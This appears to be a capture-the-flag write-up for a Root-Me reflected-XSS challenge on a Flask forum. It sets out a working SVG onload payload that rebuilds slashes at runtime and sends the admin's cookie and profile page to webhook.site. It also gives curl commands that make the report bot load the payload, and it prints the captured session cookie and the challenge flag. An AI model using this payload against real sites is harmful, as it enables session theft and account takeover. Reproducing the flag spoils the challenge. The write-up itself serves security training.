# XSS - Reflected - URI — Root-Me Pro

| | |
|---|---|
| **Category** | Web / Client |
| **Difficulty** | Medium |
| **Points** | 450 |
| **Est. time** | ~1 h |
| **Tagline** | *"Mirror mirror..."* |
| **Description** | This site presents the new video game craze called "The Pirate Creek". They've recently updated the site, but a vulnerability still seems to exist. **Get the administrator's account to steal his treasure!** |
| **Flag** | `RM{2b8443891c075f49dc25937998505c93}` |

Stack: Flask on Werkzeug 3.1.3 / Python 3.11.2, Bootstrap 5.2.3.
The app's own `<title>` is **XSS - Reflected 2**, which matches the "recently updated"
framing — this is the hardened sequel to an earlier challenge.

---

## Approach

### 1. Map the unauthenticated surface

Registration is disabled ("Servers are currently overloaded") and the POST endpoint
refuses too, so there is no account to be had. All ten forum threads return
*"The administrator does not allow you to read the content of this thread."*
`/profile` and `/logout` 302 to `/login` with `vary: Cookie`.

gobuster over `directory-list-2.3-medium` (+ `php,html,txt,json`) turned up nothing
beyond the routes already visible in the navbar:

```
forum     200    login   200    register  200
logout    302 -> /login  profile 302 -> /login
```

No `robots.txt`, `sitemap.xml`, `.env`, `.git/`, source map, or Werkzeug `/console`.

### 2. Rule out the decoy

The only custom JS, `/static/js/custom/script.js`, reads `document.location` — exactly
what a challenge named "URI" wants you to fixate on:

```js
const url = document.location;

function setActiveLink(){
    var target = url.toString();
    for(let i = 0; i < navbar.children.length; i++){
        var element = navbar.children[i];
        if(has_class(element, "nav-link") && (element.href == target || element.href == "/" + target)){
            element.classList.add("active");
            element.removeAttribute("href");
            ...
```

It only ever *string-compares* the URL to style the active nav tab. `classList.add`,
`removeAttribute` and two hardcoded `style` writes are the sum of its DOM interaction —
**there is no sink**. Red herring.

I also burned time confirming there was no reflection in the 404 body, in `/`'s query
string, in `/forum`'s query string (ffuf with `burp-parameter-names`), or in the login
error. `/forum`'s response size fluctuates per request because the comment counts are
randomised, which briefly looks like a parameter is taking effect — it isn't.

### 3. Find the actual mirror

Feeding a non-UUID into the thread route reflects it straight back:

```bash
curl -s "$T/forum/PAUKMARK123"
```
```html
Oops ! No thread where found with the uuid 'PAUKMARK123'.

You think this is an error ? Contact the administrator :
<button data-bs-toggle="modal" data-bs-target="#report-thread-modal">Report</button>
```

Two things at once: an **unescaped reflection** in plain-text HTML context, and the
**bot** that makes it exploitable. The modal posts to `/forum/report` with `url` and
`comment` — an admin then browses whatever URL you supply.

No CSP header on any response.

---

## Vulnerability

The `/forum/<uuid>` handler interpolates the unmatched UUID into its 404 template with
no HTML escaping, giving reflected XSS. Paired with `POST /forum/report`, which drives
an authenticated admin browser to an attacker-chosen URL, it becomes account takeover.

### The constraint that defines the challenge

The injection point is a **path segment**, so it is Werkzeug's path normaliser — not a
character filter — that limits the payload. Anything containing a separator gets a
**307** before routing:

| Probe | Result |
|---|---|
| `a%2Fb` — encoded `/` | **307** |
| `a%5Cb` — backslash, normalised to `/` | **307** |
| `%20 %22 %28 %2B %3F %3A %3D %3C %3E` | 404 — route matched, all usable |

That single rule explains the early confusion: `<img src=x onerror=alert(1)>` and
`<svg onload=alert(1)>` reflect perfectly, while `<script>…</script>` and even `</b>`
appear to be "filtered". They aren't — their **closing tags contain `/`**.

It also kills the usual escape hatch. `"\x2f"` would smuggle a slash past a naive
blocklist, but backslash is itself normalised, so the payload must contain neither
character anywhere. Slashes have to be produced at runtime:

```js
String.fromCharCode(47)
```

---

## Solution

```html
<svg onload="s=String.fromCharCode(47);
u='https:'+s+s+'webhook.site'+s+'<TOKEN>';
fetch(u+'?c='+encodeURIComponent(document.cookie));
fetch(s+'profile').then(r=>r.text()).then(t=>fetch(u+'?p=1',{method:'POST',body:t}))">
```

Deliberately two stages:

1. **`?c=`** — `document.cookie`, on the chance it isn't `HttpOnly`.
2. **`?p=1`** — `fetch('/profile')` inside the admin's browser and POST the rendered
   HTML back. Immune to `HttpOnly`, and immune to session expiry.

`fetch(s+'profile')` and not `fetch('profile')`: the page lives at `/forum/<payload>`,
so a relative fetch would resolve to `/forum/profile`.

Delivery — URL-encode the whole payload, verify it reflects verbatim, then wake the bot:

```bash
PAYLOAD_URL="$T/forum/$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$PAYLOAD")"

curl -s "$PAYLOAD_URL" | grep uuid          # must be 404 + verbatim, not 307

curl -s -X POST "$T/forum/report" \
     --data-urlencode "url=$PAYLOAD_URL" \
     --data-urlencode "comment=Broken thread link, please check"
# 302 -> /forum?reported=1
```

The bot (headless Chrome) fired within seconds:

```
GET  ?c=xss-reflected-2-session=eyJ1c2VybmFtZSI6ImFkbWluIn0.anlXbw.GxqyzW6Wh3Arw8ao5rpuR8dhDEY
POST ?p=1   (3180 bytes of the admin's /profile)
```

The session cookie is **not** `HttpOnly`; its Flask payload decodes to
`{"username":"admin"}` (signed, so unforgeable without `SECRET_KEY` — which is why it
had to be stolen rather than crafted).

The exfiltrated profile carried the treasure:

```html
<strong>Rank:</strong> -1/845023 pirates
<strong>Gold:</strong> ∞ 💰
<strong>Treasure:</strong> 💰 RM{2b8443891c075f49dc25937998505c93} 💰
```

Reproducible end-to-end via `solve.py`.

---

## Flag

```
RM{2b8443891c075f49dc25937998505c93}
```

---

## Lessons

- **"Filtered" is often just "routed differently."** `<script>` failing while `<svg>`
  worked had nothing to do with a blocklist — the `/` in the closing tag never reached
  the handler. When injecting into a path segment, test the *separator* characters
  first; they tell you far more than testing `<` and `>`.
- **Backslash is a path separator to Werkzeug**, so `\x2f`-style slash smuggling is dead
  in this context. `String.fromCharCode(47)` is the portable way to rebuild a URL when
  both separators are unusable.
- **Always pair cookie theft with reading the target page in-browser.** Replaying this
  cookie ~18 minutes later returned `302 /login` — the bot's session was already gone.
  Stage 2 is what actually solved it. It also defeats `HttpOnly` for free, so there is
  no reason not to include it.
- **A conspicuous hint can be the decoy.** A challenge called "URI" shipping a script
  that reads `document.location` invites a long DOM-XSS hunt; the real reflection was
  server-side, in the URI *path*.
- **Error pages are attack surface.** The reflection *and* the bot that made it
  exploitable both lived on a 404 page reached only by supplying an invalid ID.
- Throttle discovery against ephemeral instances — 30 gobuster threads pushed the
  container into mass 502/503s and polluted the results.
